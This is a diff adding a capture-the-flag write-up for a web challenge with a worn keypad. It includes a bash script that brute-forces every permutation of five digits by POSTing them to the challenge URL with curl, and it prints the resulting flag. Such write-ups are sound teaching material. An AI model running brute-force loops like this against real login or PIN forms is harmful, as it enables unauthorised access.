@@ -13,4 +13,41 @@ This challenge comes with a URL: https://old-lock-web.2021.ctfcompetition.com/
 
 Let's visit it and see what we're dealing with.
 
-TODO
+There's a keypad with some clearly worn-out buttons.
+
+![Keypad with worn out buttons 3, 5, 7, 8 and 0](old_keypad.png)
+
+There are also some instructions.
+
+![Instructions to try a 5-digit code](instructions.png)
+
+This seems pretty straightforward. It says it's a 5-digit code and there are 5 buttons worn out, so we just need to generate and try all the [permutations](https://en.wikipedia.org/wiki/Permutation) of `35780` (see [solve.sh](solve.sh)). This is easy to do because the webpage simply submits a form with the `v` parameter.
+
+```sh
+#!/bin/bash
+
+# Generate permutations.
+permutations=($(python -c 'from itertools import permutations; print("\n".join(["".join(perm) for perm in permutations("35780")]))'))
+
+
+# Try them out.
+for perm in ${permutations[@]}; do
+  echo -n "Checking ${perm}... "
+  body="$(curl -s -X POST -F "v=${perm}" https://old-lock-web.2021.ctfcompetition.com/)"
+  if echo -ne "${body}"| grep -q 'Hmm no'; then
+    echo 'WRONG'
+  else
+    echo 'RIGHT'
+    echo -ne "${body}" | grep -o 'CTF{.*}'
+    exit 0
+  fi
+done
+
+exit 1
+```
+
+Running this quickly gives us the flag.
+
+```
+CTF{IThinkWeNeedToReplaceTheKeypad}
+```
